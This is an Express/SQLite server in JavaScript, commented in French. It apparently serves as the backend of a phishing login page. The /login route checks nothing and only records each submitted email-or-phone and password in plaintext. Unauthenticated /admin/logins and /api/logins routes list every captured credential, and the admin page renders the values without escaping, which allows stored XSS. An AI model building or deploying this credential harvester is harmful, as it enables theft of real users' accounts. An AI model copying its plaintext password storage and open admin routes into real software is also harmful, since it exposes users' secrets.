const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connexion SQLite
const db = new sqlite3.Database('./database.sqlite', (err) => {
  if (err) console.error("Erreur base de données:", err);
  else console.log("✅ Connecté à SQLite");
});

// Fonction pour éviter SQLITE_BUSY
function runWithRetry(sql, params, retries = 5, callback) {
  db.run(sql, params, function (err) {
    if (err && err.code === 'SQLITE_BUSY' && retries > 0) {
      console.log(`Database locked, retrying... (${retries} left)`);
      setTimeout(() => {
        runWithRetry(sql, params, retries - 1, callback);
      }, 50);
    } else {
      callback(err, this);
    }
  });
}

// Création table users si elle n'existe pas
db.run(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    full_name TEXT NOT NULL,
    email TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    date_of_birth TEXT NOT NULL,
    gender TEXT NOT NULL
  )
`);

// Création table logins si elle n'existe pas
db.run(`
  CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    emailOrPhone TEXT,
    password TEXT,
    login_time TEXT
  )
`);

// Route signup
app.post('/signup', (req, res) => {
  const { full_name, email, password, date_of_birth, gender } = req.body;
  const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES (?, ?, ?, ?, ?)`;
  const params = [full_name, email, password, date_of_birth, gender];

  runWithRetry(sql, params, 5, (err) => {
    if (err) return res.status(400).send('Erreur création utilisateur : ' + err.message);
    res.redirect('/index.html');
  });
});

// Route login (aucune vérification)
app.post('/login', (req, res) => {
  const { emailOrPhone, password } = req.body;
  const now = new Date().toISOString();
  const sql = `INSERT INTO logins (emailOrPhone, password, login_time) VALUES (?, ?, ?)`;
  const params = [emailOrPhone, password, now];

  runWithRetry(sql, params, 5, (err) => {
    if (err) {
      console.error("Erreur insertion login:", err.message);
      return res.status(500).send('Erreur base de données');
    }
    res.redirect('/home');
  });
});

// Route home
app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Route admin pour voir tous les logins
app.get('/admin/logins', (req, res) => {
  db.all(`SELECT * FROM logins ORDER BY login_time DESC`, [], (err, rows) => {
    if (err) {
      console.error("Erreur récupération logins:", err.message);
      return res.status(500).send("Erreur base de données");
    }

    let html = `
    <html>
    <head>
        <title>Liste des logins</title>
        <link rel="stylesheet" href="/css/admin.css">
    </head>
    <body>
    <h1>Liste des logins</h1>
    <table>
    <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
    
    rows.forEach(row => {
      html += `<tr>
        <td>${row.id}</td>
        <td>${row.emailOrPhone}</td>
        <td>${row.password}</td>
        <td>${row.login_time}</td>
      </tr>`;
    });

    html += `</table></body></html>`;
    res.send(html);
  });
});
// API pour récupérer tous les logins
app.get('/api/logins', (req, res) => {
  db.all(`SELECT * FROM logins ORDER BY login_time DESC`, [], (err, rows) => {
    if (err) {
      console.error('Erreur récupération logins:', err.message);
      return res.status(500).json({ error: 'Erreur base de données' });
    }
    res.json(rows); // renvoie les données en JSON
  });
});

// Démarrage serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré : http://localhost:${PORT}`);
});
